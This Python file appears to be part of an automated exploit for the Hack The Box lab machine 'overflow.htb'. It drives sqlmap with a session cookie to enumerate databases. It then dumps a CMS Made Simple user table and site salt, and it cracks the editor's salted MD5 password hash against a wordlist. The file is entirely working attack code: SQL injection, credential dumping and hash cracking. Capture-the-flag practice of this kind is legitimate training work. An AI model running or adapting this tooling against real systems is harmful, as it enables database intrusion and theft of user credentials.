#!/usr/bin/env python3

import hashlib
import subprocess
import os
import shutil

from common_tools import Colors
import settings


class DB_dump(object):
    """docstring for DB_dump"""

    def __init__(self, cookie):
        self.cookie = cookie
        self.user = ''
        self.password_hash = ''
        self.password_salt = b''
        self.clear_pass = ''
        self.cms_db = ''
        self.sqlmap_log_file = settings.logs_folder+'overflow.htb'+os.path.sep+'log'


    def __str__(self):
        final_str = "Database infos retrieval : "
        final_str += f"user : {self.user}"+"\n"
        final_str += f"password_hash : {self.password_hash}"+"\n"
        final_str += f"password_salt : {self.password_salt}"+"\n"
        final_str += f"clear_pass : {self.clear_pass}"+"\n"
        return final_str

    def __remove_sqlmap_logs(self):
        """
            Remove generated sqlmap log file for clean env for next query
        """
        shutil.rmtree( settings.logs_folder+'overflow.htb' )


    def __perform_query(self, command) -> str:
        """
            Generic function to perform SQLMap injections queries
            return output log as a result
        """
        sqlmap_logs = ""

        proc = subprocess.Popen(command, shell=True, close_fds=True)
        proc.wait()

        if os.path.isfile(self.sqlmap_log_file):
            with open(self.sqlmap_log_file, 'r') as f:
                sqlmap_logs = f.readlines()
            self.__remove_sqlmap_logs()
        return sqlmap_logs

    def dump_schemas(self):
        """
            Dumping schemas from database
        """
        print(Colors.begin_info+"Performing SQL Injection discovery")

        command = f"sqlmap --cookie='auth={self.cookie}' -p 'name' --dbs -c {settings.conf_folder+'sqlmap.conf'} --batch --output-dir={settings.logs_folder}"

        sqlmap_logs = self.__perform_query(command=command)

        for line in sqlmap_logs:
            if line.strip().startswith('[*]'):
                print(Colors.begin_success+"Found database : "+line.strip())
                if "cmsmsdb" in line :
                    self.cms_db = line[3:].strip()

        print(Colors.begin_success+"Databse selected for dumping credentials and salt : "+Colors.colorize(self.cms_db, 'YELLOW'))


    def dump_cms_owner_account(self):
        """
            Dump CMS account (includes username & hashed password)
        """

        print(Colors.begin_info+"Dumping cms owner account...")

        command = f"sqlmap --cookie='auth={self.cookie}' -D {self.cms_db} -c {settings.conf_folder+'sqlmap.conf'} -T cms_users --columns --dump --batch --output-dir={settings.logs_folder}"

        sqlmap_logs = self.__perform_query(command=command)

        for line in sqlmap_logs:
            if "editor" in line:
                line_infos = line.strip().split('|')
                self.password_hash=line_infos[4].strip()
                self.user=line_infos[5].strip()
                print(Colors.begin_success+"Found CMS account infos : ")
                print(Colors.colorize("user : "+self.user, 'GREEN'))
                print(Colors.colorize("password hash : "+self.password_hash, 'GREEN'))
                break

    def dump_salt(self):
        """
            Dump CMS configured salt to crack user account password
        """

        print(Colors.begin_info+"Dumping salt used for hashes")

        command = f"sqlmap --cookie='auth={self.cookie}' -D {self.cms_db} -c {settings.conf_folder+'sqlmap.conf'} -T cms_siteprefs --columns --dump --batch --output-dir={settings.logs_folder}"

        sqlmap_logs = self.__perform_query(command=command)

        for line in sqlmap_logs:
            if "sitemask" in line:
                self.password_salt = line.split('|')[2].strip().encode()
                print(Colors.begin_success+Colors.colorize("Found salt ! "+self.password_salt.decode(), 'GREEN'))
                break

    def crack_cms_password(self, wordlist: str):
        """
            Crack CMS MADE SIMPLE passwords given method used from source code
        """

        if not os.path.isfile(wordlist):
            print(Colors.begin_error+"Wordlist not found : "+wordlist)
            raise IOError(f"Wordlist not found : {wordlist}")

        print(Colors.begin_info+"Cracking password : ")
        lines = []
        with open(wordlist, 'rb') as f:
            lines = f.readlines()

        for possible_password in lines:
            word = possible_password.strip()
            if hashlib.md5(self.password_salt + word).hexdigest() == self.password_hash:
                print(Colors.begin_success+Colors.colorize("Found password of editor : "+word.decode(), 'YELLOW'))
                self.clear_pass = word.decode()
                break

        if not self.clear_pass.strip():
            print(Colors.begin_error+"Something went wrong when cracking password...")
            raise ValueError("We should have cracked this password... :(")


